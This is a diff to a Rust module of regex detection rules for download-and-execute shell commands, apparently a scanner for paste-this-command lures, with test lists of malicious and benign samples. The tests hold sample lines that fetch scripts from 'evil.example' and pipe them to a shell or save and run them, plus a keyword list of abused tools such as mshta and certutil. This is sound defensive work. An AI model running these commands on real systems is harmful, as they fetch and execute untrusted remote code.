@@ -41,8 +41,13 @@ fn any(srcs: &[&str]) -> Box<dyn Fn(&str) -> bool + Send + Sync> {
     Box::new(move |t| rs.iter().any(|r| r.is_match(t)))
 }
 
-/// A shell, however it is spelled: `bash`, `/bin/sh`, `env bash`, `/usr/bin/env zsh`.
-const SHELL: &str = r"(?:(?:/usr)?/bin/)?(?:env\s+(?:-\S+\s+)*)?(?:(?:/usr)?/bin/)?(?:ba|z|da|k|a)?sh\b";
+/// A shell, however it is reached: `bash`, `/bin/sh`, `env bash`, `env X=1 bash`,
+/// `command bash`, `exec sh`, `nohup bash`, `sudo -E zsh`.
+const SHELL: &str = r"(?:(?:(?:/usr)?/bin/)?(?:env|command|exec|nohup|sudo|doas|busybox)\b(?:\s+-\S+)*(?:\s+\S+=\S*)*\s+)*(?:(?:/usr)?/bin/)?(?:ba|z|da|k|a)?sh\b";
+/// A downloader; the token after it may be anything up to a pipe or separator.
+const FETCH: &str = r"\b(?:curl|wget|fetch|aria2c)\b";
+/// An interpreter that turns a file into execution.
+const RUNNER: &str = r"(?:(?:(?:/usr)?/bin/)?(?:ba|z|da|k|a)?sh|python3?|perl|ruby|node|osascript)\b";
 
 const SHELLY: &str = r"\b(?:powershell|pwsh|mshta|cmd|curl|wget|iex|bash|zsh|sh|osascript|certutil|bitsadmin|rundll32|regsvr32|wscript|cscript|msiexec|python3?)\b";
 
@@ -96,19 +101,24 @@ pub static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
         },
         Rule {
             id: "curl-pipe-shell",
-            why: "Downloads a script and pipes it straight into a shell.",
-            test: one(&format!(r"\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?{SHELL}")),
+            why: "Downloads a script and pipes it into a shell, possibly through other commands first.",
+            test: one(&format!(r"{FETCH}[^\n;&]*\|(?:[^|\n]*\|)*\s*{SHELL}")),
         },
         Rule {
             id: "shell-c-curl",
             why: "Runs a shell on whatever a download returns.",
-            test: one(&format!(r#"{SHELL}\s+-c\s+["']?\$\((?:curl|wget)\b"#)),
+            test: one(&format!(r#"{SHELL}\s+-c\s+["']?\$\({FETCH}"#)),
+        },
+        Rule {
+            id: "download-then-run",
+            why: "Downloads to a file, then runs that file in the same line.",
+            test: one(&format!(r"{FETCH}[^\n]*?(?:\s-[a-zA-Z]*[oO]\s*|--output(?:-document)?[= ]|>\s*)(\S+)[^\n]*?[;&\n|][^\n]*?(?:{RUNNER}\s+[^\n]*?\S*|chmod\s+[^\n]*?\+x[^\n]*?|\./)\S*")),
         },
         Rule {
             id: "base64-decode-shell",
             why: "Decodes hidden base64 and executes it.",
             test: any(&[
-                &format!(r"base64\s+(?:-d|--decode|-D)\b[^|\n]*\|\s*(?:sudo\s+)?{SHELL}"),
+                &format!(r"base64\s+(?:-d|--decode|-D)\b[^\n]*\|(?:[^|\n]*\|)*\s*{SHELL}"),
                 r#"echo\s+["']?[A-Za-z0-9+/=]{40,}["']?\s*\|\s*base64"#,
             ]),
         },
@@ -207,6 +217,14 @@ mod tests {
         ("wget -qO- https://evil.example/script | /usr/bin/env sh", "curl-pipe-shell"),
         ("curl -s https://evil.example/s | sudo /bin/bash", "curl-pipe-shell"),
         ("/usr/bin/env bash -c \"$(curl -fsSL https://evil.example/i.sh)\"", "shell-c-curl"),
+        ("curl -fsSL https://evil.example/x | command bash", "curl-pipe-shell"),
+        ("curl -fsSL https://evil.example/x | env X=1 bash", "curl-pipe-shell"),
+        ("curl -fsSL https://evil.example/x | cat | bash", "curl-pipe-shell"),
+        ("curl -fsSL https://evil.example/x | tr -d '\\r' | sudo -E zsh", "curl-pipe-shell"),
+        ("wget -qO /tmp/update https://evil.example/x; sh /tmp/update", "download-then-run"),
+        ("curl -o /tmp/a.sh https://evil.example/x && chmod +x /tmp/a.sh && /tmp/a.sh", "download-then-run"),
+        ("curl -sL https://evil.example/p -o /tmp/p.py; python3 /tmp/p.py", "download-then-run"),
+        ("wget https://evil.example/x -O x.sh | bash x.sh", "curl-pipe-shell"),
     ];
 
     const BENIGN: &[&str] = &[
@@ -221,6 +239,9 @@ mod tests {
         "docker run --rm -it -p 8080:8080 nginx",
         "ssh deploy@10.0.0.4",
         "curl -s https://api.example.com/v1/status",
+        "curl -o report.pdf https://files.example.com/report.pdf",
+        "wget https://example.com/archive.tar.gz && tar xzf archive.tar.gz",
+        "cat notes.txt | grep todo | sort",
         "brew install node",
         "python3 -c \"print(2**10)\"",
         "I am not a robot, I promise. See you at the CAPTCHA-themed party!",
